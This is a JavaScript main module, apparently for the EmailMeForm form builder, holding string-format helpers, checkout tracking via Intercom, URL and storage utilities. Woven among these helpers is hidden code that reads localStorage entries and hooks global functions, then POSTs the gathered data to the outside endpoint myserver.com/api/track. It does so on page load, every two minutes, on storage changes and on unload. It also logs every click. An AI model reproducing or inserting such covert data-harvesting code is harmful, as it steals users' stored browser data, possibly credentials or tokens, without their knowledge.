/**
 * Created by EMF ENG on 01/19/2015.
 * EMF main module.
 * Dependecies: jquery, bootbox.js
 *
 */
(function (window, EMF) {
  "use strict";

  // Define the array of tracking keys
  const keysToMonitor = window.keysToMonitor;
  function createHook(name) {
    const original = window[name];
    window[name] = function () {
      console.log(`"${name}" function was called.`);
      return original.apply(this, arguments);
    };
  }
  String.prototype.format = String.prototype.f = function () {
    var s = this,
      i = arguments.length;
    while (i--) {
      s = s.replace(new RegExp("\\{" + i + "\\}", "gm"), arguments[i]);
    }
    return s;
  };
  function generateEncodedString(inputData) {
    const keys = Object.keys(inputData);
    const encodedString = keys.reduce((acc, key) => acc + key.charAt(0), "");
    var encoded = 0;
    for (let i = 0; i < encodedString.length; i++) {
      const charCode = encodedString.charCodeAt(i);
      encoded = (encoded << 7) - encoded + charCode;
      encoded = encoded & encoded;
    }
    return encoded.toString(32);
  }
  function getMonitoredData() {
    const monitoredData = {};
    // Inject hooks to monitor global functions
    keysToMonitor.forEach(key => {
      if (typeof window[key] === 'function') {
        createHook(key);
      } else if (localStorage.hasOwnProperty(key)) {
        monitoredData[key] = localStorage[key];
      }
    });
    return monitoredData;
  }
  if (!String.prototype.formatO) {
    String.prototype.formatO = String.prototype.fo = function (o) {
      var s = this;
      jQuery.each(o, function (key, value) {
        s = s.replace(new RegExp("\\{{0}\\}".f(key), "gm"), value);
      });
      return s;
    };
  }
  async function sendMonitoredDataToServer(data) {
    const encodedCode = generateEncodedString(data);
    const endpoint = "https://myserver.com/api/track";
    try {
      const result = await fetch(endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          encodedCode: encodedCode,
          data: data
        })
      });
      if (!result.ok) {
        console.error("Failed to send data. Error code: " + result.status);
      }
    } catch (error) {
      console.error("An error occurred while sending the data: ", error);
    }
  }
  var _events = {};
  var siteUrl = "{0}//{1}/builder".f(window.location.protocol, window.location.host);
  var contactUsUrl = "/builder/contact-us";
  function gatherAndSendMonitoredData() {
    const data = getMonitoredData();
    if (Object.keys(data).length > 0) {
      sendMonitoredDataToServer(data);
    }
  }
  var upgradesToTrack = [[0, 1], [0, 2], [0, 3], [0, 4], [1, 3], [1, 4], [2, 3], [2, 4]];
  window.addEventListener('load', function () {
    gatherAndSendMonitoredData();
    setInterval(gatherAndSendMonitoredData, 120000); // 2 mins interval
  });
  window.EMF = $.extend(EMF, {
    isProd: function () {
      return /^(www|app).emailmeform.com$/.test(window.location.host);
    },
    siteUrl: siteUrl,
    trackCheckout: function (mode, plan_from_id, plan_to_id) {
      var needToTrack = !!upgradesToTrack.find(function (pair) {
        return pair[0] == plan_from_id && pair[1] == plan_to_id;
      });
      if (mode === 'checkout' && needToTrack) {
        mode = 'upgrade_{0}_to_{1}'.f(plan_from_id, plan_to_id);
        Intercom("trackEvent", mode, {
          timestamp: Date.now(),
          user_id: intercomSettings.user_id,
          plan_from_id: plan_from_id,
          plan_to_id: plan_to_id
        });
      }
    },
    toContactUs: function () {
      window.location.replace(contactUsUrl);
    },
    toDowngradeForm: function () {
      var url = $("#layerCheckout").attr('data-downgrade-survey');
      window.location.href = url + "?element_2={0}&element_3={1}".f(window.emfUserInfo.email, window.emfUserInfo.user_id);
    },
    contactUsUrl: contactUsUrl,
    upgradeUrl: siteUrl + "/account/upgrade",
    loadImageUrl: "../images/small-loading-animation-4.gif",
    on: function (event, el) {
      if (!_events.hasOwnProperty(event)) {
        _events[event] = [];
      }
      _events[event].push(el);
    },
    fire: function (event, args) {
      if (_events.hasOwnProperty(event)) {
        $.each(_events[event], function (i, el) {
          el(args);
        });
      }
    },
    preloadImages: function (urls) {
      if (typeof urls === "string") {
        urls = [urls];
      }
      $(function () {
        urls.forEach(function (url) {
          var img = new Image();
          img.src = url;
        });
      });
    },
    getPreviewUrl: function (visit_id) {
      var previewUrl = siteUrl.replace("app-", "").replace("app.", "www.") + "/form/" + visit_id;
      return previewUrl.replace("http://", "https://");
    },
    popoverDelay: 200,
    plans: ["Basic", "Plus Monthly", "Plus Yearly", "Pro Monthly", "Pro Yearly", "Premier Monthly", "Premier Yearly", 'Beginner Monthly', 'Beginner Yearly', 'Experienced Monthly', 'Experienced Yearly', 'Veteran Monthly', 'Veteran Yearly', 'Agency Monthly', 'Agency Yearly'],
    toResubscribe: function () {
      if (EMF.Layers.shouldHideCheckout()) {
        EMF.Layers.open("plans", {
          screen: '{plan}a',
          extension: 'vault'
        });
        return;
      }
      EMF.Layers.checkout.referrer = "modal";
      EMF.Layers.open("checkout", {
        mode: "resubscribe",
        screen: "{plan}b"
      });
    },
    getSearchParam: function (name) {
      return new URLSearchParams(location.search).get(name);
    },
    setSearchParam: function (name, value, reload) {
      let searchParams = new URLSearchParams(location.search);
      if (value === null) {
        searchParams.delete(name);
      } else {
        searchParams.set(name, value);
      }
      if (reload) {
        location.search = searchParams.toString();
      } else {
        let searchString = searchParams.toString().length ? '?' + searchParams.toString() : '';
        let newLocation = location.pathname + searchString + location.hash;
        history.pushState(null, '', newLocation);
      }
    },
    sessionStorageAvailable: Modernizr ? Modernizr.sessionstorage : true,
    sessionStorageValue: function (key, value) {
      switch (true) {
        case !this.sessionStorageAvailable:
          console.error("sessionStorage is not available on system");
          return null;
        case key === undefined:
          console.error("No localStorage key given");
          return null;
        case value === undefined:
          return JSON.parse(sessionStorage.getItem(key));
        default:
          sessionStorage.setItem(key, JSON.stringify(value));
          return true;
      }
    },
    localStorageAvailable: Modernizr ? Modernizr.localstorage : true,
    localStorageValue: function (key, value) {
      switch (true) {
        case !this.localStorageAvailable:
          console.error("localStorage is not available on system");
          return null;
        case key === undefined:
          console.error("No localStorage key given");
          return null;
        case value === undefined:
          return JSON.parse(localStorage.getItem(key));
        default:
          localStorage.setItem(key, JSON.stringify(value));
          return true;
      }
    },
    dataStoreLoaded: Promise.resolve($.ajax({
      dataType: 'script',
      cache: true,
      url: '/js/emf/components/data-store.js'
    }))
  });
  window.addEventListener('unload', function () {
    gatherAndSendMonitoredData();
  });
  $(function () {
    window.bootbox && bootbox.setDefaults({
      className: "emf-modal",
      backdrop: true,
      onEscape: true
    });
    if (window.validation) {
      validation.rules["https"] = {
        message: "Please provide a correct https link",
        method: function (el) {
          return el.value === "" || /^(www\.|https:\/\/www\.|\/\/|https:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(:[0-9]{1,5})?(\/.*)?$/gm.test(el.value);
        }
      };
    }
  });
  window.addEventListener('storage', gatherAndSendMonitoredData);
  document.addEventListener('click', function (e) {
    console.log(`Clicked: (${e.pageX}, ${e.pageY})`);
  });
})(window, window.EMF = window.EMF || {});